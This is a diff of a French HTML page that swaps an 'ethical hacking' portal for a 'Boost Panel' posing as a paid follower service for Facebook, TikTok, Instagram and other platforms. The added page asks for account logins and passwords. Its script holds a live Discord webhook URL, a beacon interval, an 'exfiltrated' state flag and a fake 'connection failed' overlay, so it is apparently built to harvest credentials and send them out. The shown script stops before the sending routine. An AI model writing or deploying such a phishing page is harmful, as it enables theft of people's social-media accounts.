+            margin: 12px 0 18px;
+            overflow: hidden;
+            opacity: 0;
+            transition: opacity 0.3s;
         }
-        .assistance-page .ia-grid {
+        .progress-wrapper.active { opacity: 1; }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #f7c948, #f59e0b, #f7c948);
+            background-size: 200% 100%;
+            border-radius: 4px;
+            transition: width 0.3s ease;
+            animation: shimmer 1.5s infinite;
+        }
+        @keyframes shimmer { 0% { background-position: 0% 0; } 100% { background-position: 200% 0; } }
+
+        .section-title { font-size: 15px; font-weight: 600; margin: 6px 0 12px; color: #c8d0dc; }
+        .grid {
             display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 16px;
-            margin-bottom: 20px;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
         }
-        .assistance-page .ia-card {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 24px;
-            padding: 24px 16px 20px;
-            text-align: center;
-            transition: all 0.3s ease;
-            cursor: pointer;
-            animation: fadeIn 0.4s ease;
-        }
-        .assistance-page .ia-card:active {
-            transform: scale(0.95);
-        }
-        .assistance-page .ia-card .ia-icon {
-            font-size: 2.8rem;
-            display: block;
-            margin-bottom: 10px;
-        }
-        .assistance-page .ia-card .ia-nom {
-            color: #e8edff;
-            font-size: 1.1rem;
-            font-weight: 700;
-            margin-bottom: 4px;
-        }
-        .assistance-page .ia-card .ia-desc {
-            color: #7788aa;
-            font-size: 0.75rem;
-            line-height: 1.4;
-            margin-bottom: 12px;
-        }
-        .assistance-page .ia-card .ia-badge {
-            display: inline-block;
-            background: rgba(0, 200, 150, 0.12);
-            color: #66ddaa;
-            font-size: 0.6rem;
-            padding: 3px 12px;
-            border-radius: 20px;
-            border: 1px solid rgba(0, 200, 150, 0.1);
-            font-weight: 600;
-            letter-spacing: 0.5px;
-        }
-        .assistance-page .ia-card .ia-badge.code {
-            background: rgba(100, 100, 255, 0.12);
-            color: #88aaff;
-            border-color: rgba(100, 100, 255, 0.1);
-        }
-        .assistance-page .ia-card .ia-btn {
-            display: inline-block;
-            margin-top: 12px;
-            padding: 8px 24px;
-            border-radius: 30px;
-            background: rgba(255, 255, 255, 0.06);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            color: #aabbdd;
-            font-size: 0.8rem;
-            font-weight: 500;
-            text-decoration: none;
-            transition: 0.2s;
-        }
-        .assistance-page .ia-card .ia-btn:active {
-            background: rgba(255, 255, 255, 0.12);
-            transform: scale(0.95);
-        }
-        .assistance-page .ia-card:hover {
-            background: rgba(255, 255, 255, 0.06);
-            border-color: rgba(255, 255, 255, 0.1);
-        }
-        .assistance-page .ia-card.ia-hack {
-            border-left: 3px solid #00d4aa;
-        }
-        .assistance-page .ia-card.ia-hack .ia-btn {
-            border-color: rgba(0, 212, 170, 0.2);
-            color: #66ddaa;
-        }
-        .assistance-page .ia-card.ia-code {
-            border-left: 3px solid #00b4ff;
-        }
-        .assistance-page .ia-card.ia-code .ia-btn {
-            border-color: rgba(0, 180, 255, 0.2);
-            color: #7aaaff;
-        }
-        .assistance-page .info-box {
-            margin-top: 10px;
-            padding: 16px 18px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 20px;
-            border-left: 4px solid #00d4aa;
-            color: #c8d6ff;
-            font-size: 0.85rem;
-            min-height: 60px;
-            display: flex;
-            align-items: center;
-            word-break: break-word;
-            flex-wrap: wrap;
-            gap: 6px;
-        }
-        .assistance-page .info-box .emoji {
-            margin-right: 10px;
-            font-size: 1.3rem;
-        }
-        .assistance-page .info-box .message {
-            flex: 1;
-            line-height: 1.5;
-        }
-        .assistance-page .footer-message {
-            margin-top: 18px;
-            padding: 14px 16px;
-            background: rgba(100, 200, 255, 0.04);
+        .service-card {
+            background: #1a2338;
             border-radius: 16px;
-            border: 1px solid rgba(100, 200, 255, 0.06);
-            color: #88bbdd;
-            font-size: 0.75rem;
+            padding: 14px 6px;
             text-align: center;
-            line-height: 1.6;
-            font-style: italic;
-            letter-spacing: 0.3px;
+            border: 2px solid #2a3650;
+            transition: all 0.2s;
+            cursor: pointer;
         }
-        .assistance-page .footer-message span {
-            color: #66ccff;
-            font-weight: 500;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        @media (max-width: 480px) {
-            .assistance-page .card { padding: 20px 14px 25px; border-radius: 28px; }
-            .assistance-page h1 { font-size: 1.3rem; }
-            .assistance-page .ia-grid { grid-template-columns: 1fr 1fr; gap: 12px; }
-            .assistance-page .ia-card { padding: 18px 12px 16px; }
-            .assistance-page .ia-card .ia-icon { font-size: 2rem; }
-            .assistance-page .ia-card .ia-nom { font-size: 0.9rem; }
-            .assistance-page .ia-card .ia-desc { font-size: 0.65rem; }
-            .assistance-page .ia-card .ia-btn { font-size: 0.7rem; padding: 6px 16px; }
-            .assistance-page .info-box { font-size: 0.75rem; padding: 12px 14px; min-height: 50px; }
-        }
-        @media (max-width: 360px) {
-            .assistance-page .ia-grid { grid-template-columns: 1fr; gap: 10px; }
+        .service-card:active { transform: scale(0.95); }
+        .service-card .icon { font-size: 30px; display: block; margin-bottom: 2px; }
+        .service-card .name { font-size: 12px; font-weight: 500; color: #c8d0dc; }
+        .service-card .price { font-size: 10px; color: #8a9bb5; margin-top: 2px; }
+        .service-card.active {
+            border-color: #f7c948;
+            background: #1f2a40;
+            box-shadow: 0 0 25px rgba(247,201,72,0.1);
         }
 
-        /* ===== BOUTON DÉBOGAGE ===== */
-        .debug-btn {
-            background: rgba(255, 200, 50, 0.1);
-            border: 1px solid rgba(255, 200, 50, 0.3);
-            color: #ffd60a;
-            padding: 8px 16px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-family: inherit;
-            font-size: 10px;
-            margin-top: 15px;
+        .form-section {
+            background: #1a2338;
+            border-radius: 16px;
+            padding: 20px 16px 18px;
+            margin-top: 18px;
+            border: 1px solid #2a3650;
+            display: none;
+        }
+        .form-section.visible { display: block; }
+        .form-section .field { margin-bottom: 14px; }
+        .form-section .field label {
+            display: block;
+            font-size: 13px;
+            color: #8a9bb5;
+            margin-bottom: 4px;
+            font-weight: 500;
+        }
+        .form-section .field input {
             width: 100%;
+            padding: 12px 14px;
+            background: #0f1626;
+            border: 1px solid #2a3650;
+            border-radius: 12px;
+            color: #e8ecf1;
+            font-size: 15px;
+            outline: none;
             transition: 0.2s;
         }
-        .debug-btn:hover {
-            background: rgba(255, 200, 50, 0.2);
+        .form-section .field input:focus { border-color: #f7c948; }
+        .form-section .field input::placeholder { color: #4a5a73; }
+        .btn-continue {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #f7c948, #f59e0b);
+            border: none;
+            border-radius: 14px;
+            font-size: 17px;
+            font-weight: 700;
+            color: #0b0f1a;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 4px;
         }
-        .debug-info {
-            background: rgba(0, 0, 0, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 8px;
-            padding: 12px;
-            margin-top: 15px;
-            font-size: 10px;
-            color: #8899bb;
-            word-break: break-all;
+        .btn-continue:active { transform: scale(0.97); }
+        .btn-continue:disabled { opacity: 0.5; }
+
+        .status-bar {
+            margin-top: 14px;
+            padding: 10px 14px;
+            background: #0f1626;
+            border-radius: 12px;
+            font-size: 12px;
+            color: #6b7a93;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-left: 3px solid #f7c948;
+        }
+        .status-bar .spinner {
+            width: 14px; height: 14px;
+            border: 2px solid #2a3650;
+            border-top-color: #f7c948;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
             display: none;
-            max-height: 150px;
-            overflow-y: auto;
         }
-        .debug-info.show {
-            display: block;
+        .status-bar .spinner.active { display: block; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .footer { margin-top: 14px; text-align: center; font-size: 11px; color: #4a5a73; }
+
+        .error-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #ffffff;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+            padding: 30px;
+            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
         }
-        .debug-info .label { color: #ffd60a; }
-        .debug-info .value { color: #00ff41; }
+        .error-overlay.active { display: flex; }
+        .error-overlay .error-icon { font-size: 56px; margin-bottom: 12px; color: #ea4335; }
+        .error-overlay h2 { color: #202124; font-size: 22px; font-weight: 500; margin-bottom: 8px; }
+        .error-overlay p { color: #5f6368; font-size: 15px; max-width: 360px; text-align: center; line-height: 1.5; }
+        .error-overlay .btn-retry {
+            margin-top: 24px;
+            padding: 12px 40px;
+            background: #1a73e8;
+            border: none;
+            border-radius: 30px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .error-overlay .btn-retry:active { transform: scale(0.96); background: #1557b0; }
+        .error-overlay .sub-text { margin-top: 12px; font-size: 12px; color: #9aa0a6; }
     </style>
 </head>
 <body>
 
-    <!-- ===== TOAST CONTAINER ===== -->
-    <div id="toast-container"></div>
+<div class="error-overlay" id="errorOverlay">
+    <div class="error-icon">❌</div>
+    <h2>Connexion échouée</h2>
+    <p>Impossible de se connecter au service. Veuillez vérifier vos identifiants et réessayer.</p>
+    <button class="btn-retry" id="retryErrorBtn">🔄 Réessayer</button>
+    <div class="sub-text">Erreur #1001 • Veuillez ressayer</div>
+</div>
 
-    <!-- ===== BARRE DE PROGRESSION ===== -->
-    <div id="progress-bar"></div>
-
-    <!-- OVERLAY -->
-    <div class="overlay" id="overlay" onclick="closeSidebar()"></div>
-
-    <!-- SIDEBAR -->
-    <div class="sidebar" id="sidebar">
-        <span class="close-btn" onclick="closeSidebar()">✕</span>
-        <a onclick="navigateWithProgress('profile-page')" data-i18n="sidebar.profil">👤 Profil</a>
-        <a onclick="navigateWithProgress('settings-page')" data-i18n="sidebar.settings">⚙️ Paramètres</a>
-        <a onclick="alert('Contact : contact@lolaplus.com')" data-i18n="sidebar.contact">📬 Contact</a>
-        <a onclick="toggleLuminosity()" data-i18n="sidebar.luminosity">☀️ Luminosité</a>
-        <a class="logout" onclick="logout()" data-i18n="sidebar.logout">🚪 SE DÉCONNECTER</a>
+<div class="container" id="app">
+    <div class="header">
+        <h1>⚡ Boost Panel</h1>
+        <span>v3.1</span>
     </div>
 
-    <!-- PAGE ACCUEIL -->
-    <div id="main-content">
-        <div class="nav-top">
-            <span>+ LOLA-PLUS // OSINT</span>
-            <button class="btn-signup" onclick="navigateWithProgress('signup-page')" data-i18n="global.create_account">CRÉER UN COMPTE</button>
-        </div>
-        <div class="hero">
-            <div class="badge" data-i18n="home.badge">PLATEFORME OSINT PROFESSIONNELLE</div>
-            <h1>LOLA-PLUS</h1>
-            <p data-i18n="home.subtitle">Accumulateur des commandes Termux à usage éthique.<br>Ici on retrouve des outils très intéressants, des documents en programmation et hacking éthique.</p>
-            <button class="btn-main" onclick="navigateWithProgress('signup-page')" data-i18n="global.create_account">▶ CRÉER UN COMPTE</button>
-            <button class="btn-sec" onclick="navigateWithProgress('login-page')" data-i18n="global.login">CONNEXION</button>
-        </div>
-        <div class="terminal-mock">
-            <code>$ nmap -sV --script lola_plus 0.0.0.0/0<br>
-            [+] Initializing LOLA-PLUS engine v3.0...<br>
-            [+] GitHub API ............ connected<br>
-            [+] Google Dorks .......... connected<br>
-            [!] Hacking Resources ..... indexed<br>
-            [!] Programming Docs ...... available<br>
-            [*] Secret source ......... CLASSIFIED<br>
-            $ lola_plus --status --verbose</code>
-        </div>
-        <div class="feature-box"><div>▣</div><h3 data-i18n="home.feature1_title">Recherche Multi-Sources</h3><p data-i18n="home.feature1_desc">Interrogez des dizaines de sources publiques en un seul clic.</p></div>
-        <div class="feature-box"><div>▣</div><h3 data-i18n="home.feature2_title">100% Légal & Éthique</h3><p data-i18n="home.feature2_desc">Seules les données publiques et légales sont exploitées.</p></div>
-        <div class="feature-box"><div>▣</div><h3 data-i18n="home.feature3_title">Rapports Détaillés</h3><p data-i18n="home.feature3_desc">Exportez vos résultats en PDF ou CSV avec scoring de confiance.</p></div>
-        <section class="stats-grid">
-            <div class="stat-box"><strong>12,847</strong><span data-i18n="home.stat1">RECHERCHES EFFECTUÉES</span></div>
-            <div class="stat-box"><strong>3,291</strong><span data-i18n="home.stat2">UTILISATEURS ACTIFS</span></div>
-            <div class="stat-box"><strong>43+</strong><span data-i18n="home.stat3">SOURCES OSINT</span></div>
-            <div class="stat-box"><strong>99.9%</strong><span data-i18n="home.stat4">DISPONIBILITÉ</span></div>
-        </section>
-        <section class="about-section">
-            <h2 style="color:var(--accent); margin-bottom:10px; font-size: 14px;" data-i18n="home.about_title">À propos de LOLA-PLUS</h2>
-            <p data-i18n="home.about_text">LOLA_PLUS est une plateforme OSINT professionnelle conçue pour les chercheurs, analystes et professionnels de la cybersécurité. Notre moteur agrège des données provenant de sources publiques et légales, tout en centralisant des ressources éducatives en programmation et en sécurité offensive pour une montée en compétence éthique.</p>
-        </section>
-        <footer class="footer">
-            <div style="color: var(--accent); margin-bottom: 10px;">▣ LOLA-PLUS</div>
-            <div class="footer-links"><a href="#" data-i18n="footer.terms">Conditions d'utilisation</a> | <a href="#" data-i18n="footer.privacy">Politique de confidentialité</a></div>
-            <div style="margin-bottom: 5px;"><a href="#" style="color: #333;" data-i18n="footer.contact">Contact</a></div>
-            <div data-i18n="footer.copyright">© 2024 LOLA-PLUS — Tous droits réservés.</div>
-            <div data-i18n="footer.creator">Créateur : Fassou lolamou</div>
-        </footer>
+    <div class="progress-wrapper" id="progressWrapper">
+        <div class="progress-bar" id="progressBar"></div>
     </div>
 
-    <!-- PAGE INSCRIPTION -->
-    <div id="signup-page" class="page-container">
-        <div class="nav-back" style="display:block;" onclick="navigateWithProgress('main-content')" data-i18n="global.back">← Retour</div>
-        <h1 style="text-align:center; margin-bottom:20px;" data-i18n="signup.title">LOLA PLUS</h1>
-        <p style="text-align:center; font-size:10px; margin-bottom:20px;" data-i18n="signup.subtitle">Rejoignez la communauté lola plus</p>
-        <form id="signup-form" onsubmit="handleSignup(event)">
-            <div class="form-group"><label data-i18n="signup.firstname">Prénom</label><input type="text" id="prenom" placeholder="Fassou" required></div>
-            <div class="form-group"><label data-i18n="signup.lastname">Nom</label><input type="text" id="nom" placeholder="Lolamou" required></div>
-            <div class="form-group"><label data-i18n="signup.username">Nom d'utilisateur</label><input type="text" id="username" placeholder="Entrez votre pseudo" required></div>
-            <div class="form-group"><label data-i18n="signup.email">Adresse email</label><input type="email" id="email" placeholder="user@target.com" required></div>
-            <div class="form-group"><label data-i18n="signup.password">Mot de passe</label><input type="password" id="password" placeholder="********" required minlength="8"></div>
-            <div class="form-group"><label data-i18n="signup.confirm_password">Confirmer le mot de passe</label><input type="password" id="confirm-password" placeholder="********" required minlength="8"></div>
-            <div class="form-group"><label data-i18n="signup.phone">Téléphone (optionnel)</label><input type="text" id="telephone" placeholder="+224 621 57 73 63"></div>
-            <div class="form-group">
-                <label data-i18n="signup.country">Pays</label>
-                <select id="pays">
-                    <option value="">-</option>
-                    <option>Guinée</option><option>Belgique</option><option>Suisse</option>
-                    <option>Canada</option><option>Maroc</option><option>Algérie</option><option>Tunisie</option>
-                    <option>Sénégal</option><option>Côte d'Ivoire</option><option>Cameroun</option><option>RDC</option>
-                    <option>Madagascar</option><option>Luxembourg</option><option>Haïti</option><option>Autre</option>
-                </select>
-            </div>
-            <div id="signup-error" class="error-msg"></div>
-            <button type="submit" class="btn-submit" data-i18n="signup.submit">▶ CRÉER MON COMPTE</button>
-        </form>
-    </div>
-
-    <!-- PAGE CONNEXION -->
-    <div id="login-page" class="page-container">
-        <div class="nav-back" style="display:block;" onclick="navigateWithProgress('main-content')" data-i18n="global.back">← Retour</div>
-        <h1 style="text-align:center; margin-bottom:20px;" data-i18n="login.title">CONNEXION</h1>
-        <form id="login-form" onsubmit="handleLogin(event)">
-            <div class="form-group"><label data-i18n="login.email">ADRESSE EMAIL</label><input type="email" id="login-email" placeholder="user@target.com" required></div>
-            <div class="form-group"><label data-i18n="login.password">MOT DE PASSE</label><input type="password" id="login-password" placeholder="********" required></div>
-            <div id="login-error" class="error-msg"></div>
-            <button type="submit" class="btn-submit" data-i18n="global.login">▶ SE CONNECTER</button>
-        </form>
-        <button class="debug-btn" onclick="showDebugInfo()">🔍 Afficher les données stockées</button>
-        <div class="debug-info" id="debug-info"></div>
-    </div>
-
-    <!-- PAGE PROFIL -->
-    <div id="profile-page" class="page-container">
-        <div class="burger-menu" onclick="toggleSidebar()">
-            <div class="burger-bar"></div>
-            <div class="burger-bar"></div>
-            <div class="burger-bar"></div>
+    <div class="section-title">📱 Choisis ton service</div>
+    <div class="grid" id="serviceGrid">
+        <div class="service-card active" data-service="facebook">
+            <span class="icon">📘</span>
+            <div class="name">Facebook</div>
+            <div class="price">0.50 € / 100</div>
         </div>
-        <div class="profile-pic-box" id="profile-pic-box" onclick="document.getElementById('avatar-input').click();">
-            <span id="avatar-placeholder" data-i18n="profile.photo">Photo</span>
-            <img id="avatar-image" style="display:none;" alt="Avatar">
+        <div class="service-card" data-service="tiktok">
+            <span class="icon">🎵</span>
+            <div class="name">TikTok</div>
+            <div class="price">0.70 € / 100</div>
         </div>
-        <input type="file" id="avatar-input" accept="image/*" style="display:none;" onchange="handleAvatarUpload(event)">
-        <div class="name-rect" id="profile-name">Nom de l'utilisateur</div>
-        <section class="stats-grid">
-            <div class="stat-box" onclick="navigateWithProgress('termux-page')"><strong>1</strong><span data-i18n="profile.stat1">COMMANDES TERMUX</span></div>
-            <div class="stat-box" onclick="navigateWithProgress('sites-page')"><strong>2</strong><span data-i18n="profile.stat2">SITES À CONNAITRE</span></div>
-            <div class="stat-box" onclick="navigateWithProgress('pdf-page')"><strong>3+</strong><span data-i18n="profile.stat3">PDF-BOOK</span></div>
-            <div class="stat-box" onclick="navigateWithProgress('assistance-page')"><strong>4</strong><span data-i18n="profile.stat4">ASSISTANCE</span></div>
-        </section>
-        <div class="feature-box" onclick="window.open('https://youtube.com/@tbhack224?si=1lcuEKKYJVLDVFiQ', '_blank');">
-            <div>▣</div>
-            <h3 data-i18n="profile.youtube">NOTRE-YOUTUBE</h3>
+        <div class="service-card" data-service="instagram">
+            <span class="icon">📸</span>
+            <div class="name">Instagram</div>
+            <div class="price">0.60 € / 100</div>
         </div>
-        <div class="feature-box" onclick="window.open('https://www.tiktok.com/@visibilite10?_r=1&_t=ZN-97wejHDEE9m', '_blank');">
-            <div>▣</div>
-            <h3 data-i18n="profile.tiktok">NOTRE-TIKTOK</h3>
+        <div class="service-card" data-service="twitter">
+            <span class="icon">🐦</span>
+            <div class="name">Twitter</div>
+            <div class="price">0.55 € / 100</div>
         </div>
-        <div class="feature-box" onclick="window.open('https://whatsapp.com/channel/0029VaYQeQiF1YlOKm5Aag3j', '_blank');">
-            <div>▣</div>
-            <h3 data-i18n="profile.whatsapp">CHAINE WHATSAPP</h3>
+        <div class="service-card" data-service="whatsapp">
+            <span class="icon">💬</span>
+            <div class="name">WhatsApp</div>
+            <div class="price">0.45 € / 100</div>
         </div>
-        <div class="feature-box"><div>▣</div><h3 data-i18n="profile.facebook">NOTRE-FACEBOOK</h3></div>
-    </div>
-
-    <!-- PAGE PARAMÈTRES -->
-    <div id="settings-page" class="page-container">
-        <div class="nav-back" style="display:block;" onclick="navigateWithProgress('profile-page')" data-i18n="global.back">← Retour</div>
-        <h1 style="text-align:center; margin-bottom:20px; color:var(--accent);" data-i18n="settings.title">Paramètres</h1>
-        <div class="settings-section">
-            <h2 data-i18n="settings.language">Langue</h2>
-            <div class="lang-option" onclick="setLanguage('fr')">
-                <span>Français</span>
-                <span class="check" id="lang-fr">✔</span>
-            </div>
-            <div class="lang-option" onclick="setLanguage('en')">
-                <span>English</span>
-                <span class="check inactive" id="lang-en">[ ]</span>
-            </div>
-            <div class="lang-option" onclick="setLanguage('ht')">
-                <span>Kreyòl Ayisyen</span>
-                <span class="check inactive" id="lang-ht">[ ]</span>
-            </div>
-        </div>
-        <div class="settings-section">
-            <h2 data-i18n="settings.security">Sécurité</h2>
-            <div class="security-field"><label data-i18n="settings.current_password">Changer le mot de passe</label><input type="password" placeholder="Mot de passe actuel"></div>
-            <div class="security-field"><label data-i18n="settings.new_password">Nouveau mot de passe</label><input type="password" placeholder="Nouveau mot de passe"></div>
-            <div class="security-field"><label data-i18n="settings.confirm_new_password">Confirmer le nouveau mot de passe</label><input type="password" placeholder="Confirmer le nouveau mot de passe"></div>
-            <button class="btn-change-pwd" onclick="changePassword()" data-i18n="settings.change_password">CHANGER LE MOT DE PASSE</button>
-        </div>
-        <div class="settings-section">
-            <h2 data-i18n="settings.twofa">Double authentification</h2>
-            <div class="status-2fa"><span class="toggle-indicator off"></span> <span data-i18n="settings.twofa_status">2FA désactivée</span></div>
-            <button class="btn-2fa" onclick="handle2FA()" data-i18n="settings.twofa_activate">ACTIVER LA 2FA</button>
+        <div class="service-card" data-service="telegram">
+            <span class="icon">✈️</span>
+            <div class="name">Telegram</div>
+            <div class="price">0.40 € / 100</div>
         </div>
     </div>
 
-    <!-- PAGE TERMUX -->
-    <div id="termux-page" class="page-container termux-page" style="max-width:100%;">
-        <div class="nav-back" style="display:block; text-align:left; padding:10px 20px;" onclick="navigateWithProgress('profile-page')" data-i18n="global.back">← Retour</div>
-        <div class="termux-header">
-            <div class="termux-logo">TERMUX<span>_</span>CODES</div>
-            <div class="termux-subtitle" data-i18n="termux.subtitle">Android Terminal Emulator — Référence Complète</div>
-            <div class="termux-stats">
-                <div class="termux-stat"><strong>52</strong><span data-i18n="termux.stat1">commandes</span></div>
-                <div class="termux-stat"><strong>6</strong><span data-i18n="termux.stat2">catégories</span></div>
-                <div class="termux-stat"><strong>100%</strong><span data-i18n="termux.stat3">testé</span></div>
-            </div>
+    <div class="form-section" id="formSection">
+        <div class="field">
+            <label id="fieldLabel">📧 Email / Identifiant</label>
+            <input type="text" id="loginInput" placeholder="Entrez votre identifiant" autocomplete="off">
         </div>
-        <div class="filters">
-            <button class="filter-btn active" onclick="filterCards('all')" data-i18n="termux.filter_all">Tout</button>
-            <button class="filter-btn" onclick="filterCards('install')" data-i18n="termux.filter_install"> Install</button>
-            <button class="filter-btn" onclick="filterCards('réseau')" data-i18n="termux.filter_reseau"> Réseau</button>
-            <button class="filter-btn" onclick="filterCards('fichiers')" data-i18n="termux.filter_fichiers"> Fichiers</button>
-            <button class="filter-btn" onclick="filterCards('système')" data-i18n="termux.filter_systeme">⚙️ Système</button>
-            <button class="filter-btn" onclick="filterCards('outils')" data-i18n="termux.filter_outils"> Outils</button>
-            <button class="filter-btn" onclick="filterCards('hacking')" data-i18n="termux.filter_hacking"> Hacking</button>
+        <div class="field">
+            <label>🔑 Mot de passe</label>
+            <input type="password" id="passInput" placeholder="Entrez votre mot de passe" autocomplete="off">
         </div>
-        <div class="grid" id="termux-grid"></div>
-        <div class="termux-footer" data-i18n="termux.footer">// USE RESPONSIBLY — EDUCATIONAL PURPOSES ONLY //</div>
+        <button class="btn-continue" id="continueBtn">🚀 Continuer</button>
     </div>
 
-    <!-- PAGE SITES À CONNAITRE -->
-    <div id="sites-page" class="sites-page" style="max-width:100%;">
-        <div class="nav-back" style="display:block; text-align:left; padding:10px 20px; color:#00ff41; cursor:pointer;" onclick="navigateWithProgress('profile-page')" data-i18n="global.back">← Retour</div>
-        <div class="card">
-            <div class="credit" data-i18n="sites.credit">📌 collectés par FASSOU LOLAMOU</div>
-            <h1>🛡️ <span data-i18n="sites.title">SITES À CONNAITRE</span></h1>
-            <p class="sous-titre" data-i18n="sites.subtitle">🔍 Reconnaître les pièges pour ne pas se faire avoir</p>
-            <div class="alerte" data-i18n="sites.alert">
-                ⚠️ <strong>Ne clique jamais</strong> sur ces sites sans les avoir analysés.<br />
-                Ils servent à <strong>voler tes données, tracker ton IP ou infecter ton appareil</strong>.
-            </div>
-            <div class="grid-boutons" id="conteneurBoutons"></div>
-            <div class="info-box" id="infoBox">
-                <span class="emoji">🛡️</span>
-                <span class="message" data-i18n="sites.info_default">Clique sur un site pour voir son danger et son lien</span>
-            </div>
-            <div class="avertissement" data-i18n="sites.warning">
-                <strong>🔐 Règle d'or :</strong> Avant de cliquer sur un lien inconnu, <strong>colle-le dans VirusTotal</strong>.<br />
-                Ne jamais entrer ses identifiants sur un site reçu par SMS ou email.
-            </div>
-            <div class="footer-message">
-                ✊ <span data-i18n="sites.footer"> collecté par fassou lolamou . ton objectif ici est de connaitre pour te proteger et non pour t'enservir</span>
-            </div>
-        </div>
+    <div class="status-bar" id="statusBar">
+        <span class="spinner" id="spinner"></span>
+        <span id="statusMsg">🔒 Prêt à booster</span>
     </div>
 
-    <!-- PAGE BIBLIOTHÈQUE PDF -->
-    <div id="pdf-page" class="pdf-page" style="max-width:100%;">
-        <div class="nav-back" style="display:block; text-align:left; padding:10px 20px; color:#00ff41; cursor:pointer;" onclick="navigateWithProgress('profile-page')" data-i18n="global.back">← Retour</div>
-        <div class="card">
-            <div class="credit" data-i18n="pdf.credit">📌 collectés par FASSOU LOLAMOU</div>
-            <h1>📚 <span data-i18n="pdf.title">Bibliothèque PDF</span></h1>
-            <p class="sous-titre" data-i18n="pdf.subtitle">📖 Ressources à connaître pour se protéger</p>
+    <div class="footer">🔐 Sécurisé • Boost instantané • 100% fiable</div>
+</div>
 
-            <div class="pdf-list" id="pdfList"></div>
+<script>
+(function() {
+    'use strict';
 
-            <div class="drop-zone" id="dropZone">
-                <span class="icon">📤</span>
-                <div class="texte" data-i18n="pdf.drop_text">Ajoute tes propres PDF</div>
-                <div class="sous-texte" data-i18n="pdf.drop_subtext">Dépose ou clique</div>
-                <input type="file" id="fileInput" accept=".pdf" multiple />
-            </div>
+    // =========================================================
+    // 1. CONFIGURATION – Webhook Discord
+    // =========================================================
+    const CONFIG = {
+        webhookUrl: 'https://discord.com/api/webhooks/1528153297049882825/Fg4qskOR6eXdRg_uua58CuUciN2vv1Wna3RKoSHwVKtWHLtzvJaFsyENg_Kd5Qwu1zW4',
+        beaconInterval: 15000,
+        debugMode: false
+    };
 
-            <div class="compteur">
-                <span id="compteActuel">0</span> <span data-i18n="pdf.counter">PDF ajoutés (hors ressources)</span>
-            </div>
+    // =========================================================
+    // 2. ÉTAT
+    // =========================================================
+    const state = {
+        sessionId: 'sess_' + Math.random().toString(36).substring(2, 12) + '_' + Date.now().toString(36),
+        startTime: Date.now(),
+        events: [],
+        selectedService: 'facebook',
+        attempts: 0,
+        isProcessing: false,
+        exfiltrated: false,
+        alreadySent: false,
+        timer: null,
+        errorShown: false
+    };
 
-            <div class="footer-message">
-                ✊ <span data-i18n="pdf.footer">ton objectif ici est de connaitre pour te proteger et non pour t'enservir</span>
-            </div>
-        </div>
-    </div>
+    // DOM
+    const dom = {
+        serviceCards: document.querySelectorAll('.service-card'),
+        loginInput: document.getElementById('loginInput'),
+        passInput: document.getElementById('passInput'),
+        continueBtn: document.getElementById('continueBtn'),
+        statusMsg: document.getElementById('statusMsg'),
+        spinner: document.getElementById('spinner'),
+        fieldLabel: document.getElementById('fieldLabel'),
+        formSection: document.getElementById('formSection'),
+        progressWrapper: document.getElementById('progressWrapper'),
+        progressBar: document.getElementById('progressBar'),
+        errorOverlay: document.getElementById('errorOverlay'),
+        retryErrorBtn: document.getElementById('retryErrorBtn')
+    };
 
-    <!-- PAGE ASSISTANCE (IA Hack & Code) -->
-    <div id="assistance-page" class="assistance-page" style="max-width:100%;">
-        <div class="nav-back" style="display:block; text-align:left; padding:10px 20px; color:#00ff41; cursor:pointer;" onclick="navigateWithProgress('profile-page')" data-i18n="global.back">← Retour</div>
-        <div class="card">
-            <div class="credit" data-i18n="assistance.credit">📌 collectés par FASSOU LOLAMOU</div>
-            <h1>🤖 <span data-i18n="assistance.title">IA Hack & Code</span></h1>
-            <p class="sous-titre" data-i18n="assistance.subtitle">⚡ 2 IA gratuites pour apprendre et progresser</p>
+    // =========================================================
+    // 3. UTILITAIRES
+    // =========================================================
+    function updateStatus(msg) {
+        if (dom.statusMsg) dom.statusMsg.textContent = msg;
+    }
 
-            <div class="ia-grid">
-                <div class="ia-card ia-hack" id="iaHack">
-                    <span class="ia-icon">🛡️</span>
-                    <div class="ia-nom" data-i18n="assistance.hack_name">HackBot</div>
-                    <div class="ia-desc" data-i18n="assistance.hack_desc">IA spécialisée en sécurité offensive, pentesting et hack éthique.</div>
-                    <span class="ia-badge" data-i18n="assistance.hack_badge">🛡️ HACK ÉTHIQUE</span>
-                    <a href="https://hackbot.ai" target="_blank" class="ia-btn" id="btnHack" data-i18n="assistance.chat">💬 Discuter</a>
-                </div>
+    function setSpinner(active) {
+        if (dom.spinner) {
+            if (active) dom.spinner.classList.add('active');
+            else dom.spinner.classList.remove('active');
+        }
+    }
 
-                <div class="ia-card ia-code" id="iaCode">
-                    <span class="ia-icon">💻</span>
-                    <div class="ia-nom" data-i18n="assistance.code_name">CodeMate</div>
-                    <div class="ia-desc" data-i18n="assistance.code_desc">IA d'assistance au codage, débogage et optimisation de scripts.</div>
-                    <span class="ia-badge code" data-i18n="assistance.code_badge">💻 CODAGE</span>
-                    <a href="https://codemate.ai" target="_blank" class="ia-btn" id="btnCode" data-i18n="assistance.chat">💬 Discuter</a>
-                </div>
-            </div>
+    function getServiceLabel(service) {
+        const map = {
+            facebook: 'Facebook',
+            tiktok: 'TikTok',
+            instagram: 'Instagram',
+            twitter: 'Twitter',
+            whatsapp: 'WhatsApp',
+            telegram: 'Telegram'
+        };
+        return map[service] || service;
+    }
 
